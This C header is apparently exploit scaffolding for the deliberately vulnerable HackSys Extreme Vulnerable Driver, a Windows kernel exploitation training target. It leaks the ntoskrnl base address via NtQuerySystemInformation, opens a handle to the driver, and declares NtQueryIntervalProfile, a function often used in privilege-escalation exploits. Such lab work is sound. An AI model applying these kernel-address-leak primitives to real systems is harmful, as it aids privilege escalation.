#pragma once

#include <windows.h>
#include <psapi.h>
#include <tchar.h>
#include <stdio.h>

typedef NTSTATUS(NTAPI *PtrNtQuerySystemInformation)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);

typedef NTSTATUS(NTAPI *PtrNtQueryIntervalProfile)(
	DWORD ProfileSource,
	PULONG Interval
	);
typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation = 0,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemProcessInformation = 5,
	SystemProcessorPerformanceInformation = 8,
	SystemModuleInformation = 11,
	SystemInterruptInformation = 23,
	SystemExceptionInformation = 33,
	SystemRegistryQuotaInformation = 37,
	SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;

#define MAXIMUM_FILENAME_LENGTH 255 

typedef struct SYSTEM_MODULE {
	ULONG                Reserved1;
	ULONG                Reserved2;
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	WORD                 Id;
	WORD                 Rank;
	WORD                 w018;
	WORD                 NameOffset;
	BYTE                 Name[MAXIMUM_FILENAME_LENGTH];
}SYSTEM_MODULE, *PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

PSYSTEM_MODULE getNtoskrnlInfo()
{
	// Get handle to ntdll.dll
	HMODULE ntdll = GetModuleHandle("ntdll");
	if (ntdll == NULL)
	{
		printf("[-] Failed to get handle to ntdll.dll.\n");
		exit(-1);
	}

	// Get address of NtQuerySystemInformation
	PtrNtQuerySystemInformation _NtQuerySystemInformation = (PtrNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
	if (_NtQuerySystemInformation == NULL)
	{
		printf("[-] Failed to get address of NtQuerySystemInformation.\n");
		exit(-1);
	}

	// First query the actual size of the information requested, this is stored into retLength
	ULONG retLength;
	_NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &retLength);
	PSYSTEM_MODULE_INFORMATION ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, retLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!ModuleInfo)
	{
		printf("[-] Failed to allocate memory for ModuleInfo.\n");
		exit(-1);
	}

	// Now query the information again and write them into ModuleInfo
	_NtQuerySystemInformation(SystemModuleInformation, ModuleInfo, retLength, &retLength);
	return &ModuleInfo->Modules[0];
}

HANDLE getDriverHandle()
{
	// Create handle to driver
	HANDLE device = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);

	if (device == INVALID_HANDLE_VALUE)
	{
		printf("[-] Failed to open handle to device.");
		exit(-1);
	}

	return device;
}